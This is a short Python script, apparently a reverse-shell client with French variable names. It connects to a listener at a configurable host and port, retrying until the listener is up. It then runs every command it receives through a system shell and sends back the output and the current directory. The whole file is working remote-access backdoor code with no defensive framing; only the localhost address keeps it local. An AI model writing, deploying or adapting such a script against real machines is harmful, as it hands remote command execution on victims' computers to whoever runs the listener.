import socket, os, subprocess, time
boucle = True
hote = "127.0.0.1"
port = 25565
clearconsole = "cls"
nothing = " ".encode()

os.system(clearconsole)
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while boucle is True:
    try:
        socket.connect((hote, port))
        os.system(clearconsole)
        boucle = False
    except ConnectionRefusedError:
        time.sleep(3)
        os.system(clearconsole)
        print("Aucun server ",hote," n'est ouvert")

boucle = True

while boucle is True:
    jesuisou = os.getcwd().encode()
    socket.send(jesuisou)
    
    try:
        commande = socket.recv(50).decode()
        if commande != "closeserverclient":
            stderr = b''
            stdout = b''
            if 'cd' in commande:
                derniereLettre = commande[-1]
                directory = commande[3:-1]+derniereLettre
                try:
                    os.chdir(directory)
                except FileNotFoundError:
                    stdout = b"Le dossier/fichier n'existe pas"
            else:
                commande = commande.encode()
                spl = subprocess.Popen(str(commande, "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = spl.communicate()
            if stdout == b'':
                socket.send(stderr)
            if stderr == b'':
                socket.send(stdout)
            if stdout == b'' and stderr == b'':
                socket.send(nothing)
        elif "cls" == commande:
            socket.send(" ".encode())
        elif "" == commande:
            socket.send(" ".encode())
        else:
            boucle = False
    except ConnectionResetError:
        socket.close()
socket.close()